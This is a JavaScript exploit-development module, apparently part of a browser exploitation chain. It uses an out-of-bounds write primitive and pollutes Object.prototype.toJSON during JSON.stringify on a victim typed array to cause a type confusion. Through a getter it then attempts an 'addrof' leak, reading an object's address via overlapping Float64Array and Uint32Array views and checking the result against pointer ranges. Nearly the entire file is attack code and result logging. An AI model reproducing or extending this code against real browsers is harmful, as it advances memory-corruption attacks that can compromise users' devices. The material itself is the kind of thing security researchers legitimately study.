// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - Revisado 7)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF];

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282; 
const PROBE_CALL_LIMIT_V82 = 10; 

// object_to_leak_A_v82 e B serão definidos por iteração para clareza

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AdvancedGetterLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        toJSON_details: null, 
        stringifyResult: null,
        addrof_A_result: { success: false, msg: "Addrof A (Getter): Not set.", value: null },
        addrof_B_result: { success: false, msg: "Addrof B (Direct): Not set.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed: false
    };
    
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; 
        let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null;
        let marker_M2_ref_iter = null;
        
        // Variável da iteração para armazenar os detalhes da TC, preenchida pela sonda via closure
        let iteration_final_tc_details = null; 
        let iteration_tc_first_detection_done = false; 

        // Definidos aqui para serem capturados pelo closure da sonda da iteração
        const current_object_to_leak_A = { marker_A_v82: `LeakA_OOB_Val${toHex(current_oob_value)}` };
        const current_object_to_leak_B = { marker_B_v82: `LeakB_OOB_Val${toHex(current_oob_value)}` };
        
        function toJSON_TA_Probe_Iter_Closure() {
            probe_call_count_iter++;
            const call_num = probe_call_count_iter;
            const current_this_type_str = Object.prototype.toString.call(this);
            const is_this_M2_confused = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && current_this_type_str === '[object Object]');

            logS3(`[PROBE_R7] Call #${call_num}. 'this': ${current_this_type_str}. IsM2Raw=${this === marker_M2_ref_iter}. IsM2Confused? ${is_this_M2_confused}. TC DetectedFlag: ${iteration_tc_first_detection_done}`, "leak");

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) {
                    logS3(`[PROBE_R7] Call #${call_num}: Probe call limit exceeded.`, "warn");
                    return { recursion_stopped_iter_r7: true, reason: "Probe call limit exceeded" };
                }

                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter", some_prop_M2: "M2_Initial_Value_Iter" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_R7] Call #${call_num} (Victim): M1_iter and M2_iter markers created. Returning M1_iter.`, "info");
                    return marker_M1_ref_iter;
                } else if (is_this_M2_confused) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true; 
                        logS3(`[PROBE_R7] Call #${call_num} (M2 Confused): FIRST TC detection. Setting up iteration_final_tc_details. ID: ${this.marker_id_v82}`, "vuln");
                        
                        iteration_final_tc_details = { // Este objeto é do escopo do loop 'for'
                            call_number_tc_detected: call_num,
                            probe_variant: "TA_Probe_Iter_Closure_R7", this_type: "[object Object]", this_is_M2: true,
                            getter_defined: false, direct_prop_set: false, getter_fired_during_stringify: false,
                            leaked_value_from_getter_as_int64_str: null, leaked_value_is_potential_ptr: false,
                            error_in_probe: null
                        };
                        // O getter definido abaixo irá modificar este objeto iteration_final_tc_details via closure.
                    } else {
                        logS3(`[PROBE_R7] Call #${call_num} (M2 Confused): Subsequent M2 confused call. iteration_final_tc_details already exists. ID: ${this.marker_id_v82}`, "info");
                    }

                    // Apenas define/redefine o getter se esta é a chamada que está configurando iteration_final_tc_details,
                    // ou se iteration_final_tc_details já foi configurado (para garantir que o getter esteja sempre lá em M2).
                    // No entanto, para evitar redefinições desnecessárias, podemos checar se já foi definido.
                    if (iteration_final_tc_details && (!this.hasOwnProperty('leaky_A_getter_v82') || iteration_final_tc_details.call_number_tc_detected === call_num) ) {
                        logS3(`[PROBE_R7] Call #${call_num} (M2 Confused): Defining/Redefining getter and prop on 'this' (M2).`, "info");
                        try {
                            Object.defineProperty(this, 'leaky_A_getter_v82', {
                                get: function () {
                                    // Acessa iteration_final_tc_details do closure
                                    const tc_call_num = iteration_final_tc_details ? iteration_final_tc_details.call_number_tc_detected : "UNKNOWN_TC_CALL";
                                    logS3(`[PROBE_R7] !!! Getter 'leaky_A_getter_v82' (M2 TC setup in call #${tc_call_num}) FIRED !!!`, "vuln");
                                    if (iteration_final_tc_details) iteration_final_tc_details.getter_fired_during_stringify = true;

                                    if (!victim_typed_array_ref_iter?.buffer) {
                                        if (iteration_final_tc_details) iteration_final_tc_details.leaked_value_from_getter_as_int64_str = "getter_victim_null_err";
                                        return "getter_victim_null_err";
                                    }
                                    let lvf = NaN, lis = "getter_default_err_r7";
                                    try {
                                        let vfv = new Float64Array(victim_typed_array_ref_iter.buffer);
                                        let vu32 = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                        const o_l = vu32[0], o_h = vu32[1];
                                        vfv[0] = current_object_to_leak_A; // Usa a variável da iteração
                                        lvf = vfv[0]; let llo = vu32[0], lhi = vu32[1];
                                        lis = new AdvancedInt64(llo, lhi).toString(true);
                                        vu32[0] = o_l; vu32[1] = o_h; 
                                        if (iteration_final_tc_details) iteration_final_tc_details.leaked_value_from_getter_as_int64_str = lis;
                                        logS3(`[PROBE_R7] Getter: Leaked Int64 Str: ${lis}`, "leak");
                                        const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                                        if (!nan_inf && lhi !== 0) {
                                            if ((lhi >= 0xFFFF0000) || (lhi > 0 && lhi < 0xF0000) || (lhi >= 0x100000 && lhi < 0x7F000000)) { // AJUSTAR INTERVALOS
                                                if (iteration_final_tc_details) iteration_final_tc_details.leaked_value_is_potential_ptr = true;
                                                logS3(`[PROBE_R7] Getter: Potential pointer: ${lis}`, "vuln"); return lvf;
                                            } 
                                            logS3(`[PROBE_R7] Getter: Value ${lis} not in likely pointer ranges.`, "info"); return "getter_val_not_in_ptr_range";
                                        } 
                                        if (nan_inf) logS3(`[PROBE_R7] Getter: Value ${lis} is NaN or Infinity.`, "warn");
                                        else logS3(`[PROBE_R7] Getter: Value ${lis} is likely NULL or zero.`, "info");
                                        return "getter_val_is_nan_inf_or_zero";
                                    } catch (e_get) {
                                        const getter_err_msg = `getter_exception: ${e_get.message || String(e_get)}`;
                                        if (iteration_final_tc_details) iteration_final_tc_details.leaked_value_from_getter_as_int64_str = getter_err_msg;
                                        logS3(`[PROBE_R7] Getter: EXCEPTION: ${getter_err_msg}`, "error");
                                        return getter_err_msg;
                                    }
                                }, enumerable: true, configurable: true
                            });
                            if (iteration_final_tc_details) iteration_final_tc_details.getter_defined = true;

                            this.leaky_B_direct_v82 = current_object_to_leak_B; // Usa a variável da iteração
                            if (iteration_final_tc_details) iteration_final_tc_details.direct_prop_set = true;
                        } catch (e_m2_int_def) {
                            const m2_def_err_msg = `M2_Define_Err: ${e_m2_int_def.message || String(e_m2_int_def)}`;
                            if (iteration_final_tc_details) iteration_final_tc_details.error_in_probe = m2_def_err_msg;
                             logS3(`[PROBE_R7] Call #${call_num} (M2 Confused): Error defining M2 props: ${m2_def_err_msg}`, "error");
                        }
                         logS3(`[PROBE_R7] Call #${call_num} (M2 Confused): Returning 'this' (M2). TC Details Obj: ${JSON.stringify(iteration_final_tc_details)}`, "info");
                    }
                    return this; 
                }
            } catch (e_probe_main) { 
                const probe_main_err_msg = `MainProbeErr: ${e_probe_main.message || String(e_probe_main)}`;
                logS3(`[PROBE_R7] Call #${call_num}: Main ERROR in probe: ${probe_main_err_msg}`, "critical");
                if (iteration_final_tc_details && iteration_final_tc_details.call_number_tc_detected === call_num) {
                    iteration_final_tc_details.error_in_probe = probe_main_err_msg;
                }
                return { err_probe_main_iter: call_num, msg: probe_main_err_msg }; 
            }
            return { gen_marker_iter: call_num, type: current_this_type_str };
        } 
        // Fim da definição de toJSON_TA_Probe_Iter_Closure

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_error = null;
        let iter_addrof_A = { success: false, msg: "Getter: Default", value: null };
        let iter_addrof_B = { success: false, msg: "Direct: Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(150); // Aumentar pausa ligeiramente

            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  Victim Uint8Array created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                logS3(`  toJSON polluted. Calling JSON.stringify...`, "info", FNAME_CURRENT_ITERATION);
                
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                
                logS3(`  JSON.stringify completed. Raw: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); }
                catch (e_parse) { 
                    logS3(`  ERROR parsing JSON output: ${e_parse.message}`, "error", FNAME_CURRENT_ITERATION);
                    iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output }; 
                }
                
                // Verifica iteration_final_tc_details (preenchido pela sonda via closure)
                if (iteration_final_tc_details && iteration_final_tc_details.this_is_M2 && iteration_final_tc_details.this_type === "[object Object]") {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  EXECUTE: Heisenbug (TC on M2) CONFIRMED via iteration_final_tc_details.`, "vuln", FNAME_CURRENT_ITERATION);
                    logS3(`  EXECUTE: Captured M2 details: ${JSON.stringify(iteration_final_tc_details)}`, "leak", FNAME_CURRENT_ITERATION);

                    const m2_summary = iteration_final_tc_details; // É o próprio objeto de detalhes
                    iter_addrof_A.value = m2_summary.leaked_value_from_getter_as_int64_str;
                    if (m2_summary.leaked_value_is_potential_ptr) {
                        iter_addrof_A.success = true;
                        iter_addrof_A.msg = `Potential pointer from getter: ${m2_summary.leaked_value_from_getter_as_int64_str}`;
                    } else {
                        iter_addrof_A.msg = `Getter val ${m2_summary.leaked_value_from_getter_as_int64_str || 'N/A'} not deemed pointer.`;
                    }
                    if (m2_summary.error_in_probe) iter_error = iter_error || new Error(m2_summary.error_in_probe); // Pega erro da sonda se houver
                    
                    // Checagem de leaky_B_direct_v82
                    let m2_obj_from_json = iter_stringify_output_parsed?.payload_M2 || iter_stringify_output_parsed; // payload_M2 é o M1.payload_M2
                    if (m2_obj_from_json && marker_M2_ref_iter && m2_obj_from_json.marker_id_v82 === marker_M2_ref_iter.marker_id_v82) {
                        const val_direct = m2_obj_from_json.leaky_B_direct_v82;
                        iter_addrof_B.value = val_direct;
                        if (val_direct && current_object_to_leak_B && val_direct.marker_B_v82 === current_object_to_leak_B.marker_B_v82) {
                            iter_addrof_B.success = true; iter_addrof_B.msg = `objB identity confirmed.`;
                        } else { iter_addrof_B.msg = `Direct prop not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                    } else { iter_addrof_B.msg = "M2 payload not found as expected in stringify output for leaky_B check."; }
                } else {
                    logS3(`  EXECUTE: Heisenbug (TC on M2) NOT Confirmed. iteration_final_tc_details: ${JSON.stringify(iteration_final_tc_details)}`, "error", FNAME_CURRENT_ITERATION);
                    iter_addrof_A.msg = "TC on M2 not confirmed by iteration_final_tc_details.";
                    iter_addrof_B.msg = "TC on M2 not confirmed by iteration_final_tc_details.";
                }
            } catch (e_str) { iter_error = e_str; logS3(`  ERROR during JSON.stringify/probe: ${e_str.message || String(e_str)}`, "critical", FNAME_CURRENT_ITERATION);} 
            finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey];
                }
            }
        } catch (e_outer) { iter_error = e_outer; logS3(`  CRITICAL ERROR in iteration: ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_ITERATION); } 
        finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_error ? (iter_error.message || String(iter_error)) : null,
            toJSON_details_this_iter: iteration_final_tc_details ? JSON.parse(JSON.stringify(iteration_final_tc_details)) : null, // Cópia profunda para o sumário
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_this_iter: iter_addrof_A, addrof_B_this_iter: iter_addrof_B,
            heisenbug_on_M2_this_iter: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        const old_best_score = (best_result_for_runner.addrof_A_result.success || best_result_for_runner.addrof_B_result.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed ? 1 : 0);
        const current_score = (iter_addrof_A.success || iter_addrof_B.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0);

        if (current_score > old_best_score || (current_score > 0 && !best_result_for_runner.oob_value_used) ) {
             best_result_for_runner = {
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : null,
                toJSON_details: iteration_final_tc_details ? JSON.parse(JSON.stringify(iteration_final_tc_details)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A, addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { 
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : best_result_for_runner.errorOccurred,
                toJSON_details: iteration_final_tc_details ? JSON.parse(JSON.stringify(iteration_final_tc_details)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A, addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value), heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        }
        
        if (iter_addrof_A.success || iter_addrof_B.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrLeaked! Val${toHex(current_oob_value)}`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: TC Confirmed Val${toHex(current_oob_value)}`;
        else document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: Iter ${toHex(current_oob_value)} Done`;
        
        await PAUSE_S3(250); // Pausa um pouco maior
    } // Fim do loop for

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner (detailed): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { 
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.toJSON_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result,
        addrof_B_result: best_result_for_runner.addrof_B_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed
    };
}
